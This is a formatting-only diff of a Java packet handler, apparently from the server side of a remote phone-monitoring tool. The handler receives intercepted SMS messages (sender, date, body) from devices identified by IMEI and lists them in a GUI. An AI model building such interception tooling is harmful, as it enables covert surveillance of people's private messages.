@@ -1,22 +1,20 @@
 package handler;
 
+import gui.GUI;
 import server.Server;
-import Packet.CallStatusPacket;
 import Packet.Packet;
 import Packet.ShortSMSPacket;
-import gui.GUI;
 
 public class SMSMonitorHandler implements PacketHandler {
-	
+
 	private GUI gui;
 	private int channel;
 	private String imei;
-	
-	public SMSMonitorHandler()
-	{
-		
+
+	public SMSMonitorHandler() {
+
 	}
-	
+
 	public SMSMonitorHandler(int channel, String imei, GUI gui) {
 		this.gui = gui;
 		this.channel = channel;
@@ -33,7 +31,8 @@ public class SMSMonitorHandler implements PacketHandler {
 		gui.logTxt("SMS data has been received");
 		c.getChannelHandlerMap().get(imei).getStorage(channel).reset();
 		ShortSMSPacket packet = (ShortSMSPacket) p;
-		gui.addMonitoredSMS(imei, packet.getAddress(), packet.getDate(), packet.getBody());
+		gui.addMonitoredSMS(imei, packet.getAddress(), packet.getDate(),
+				packet.getBody());
 	}
 
 }
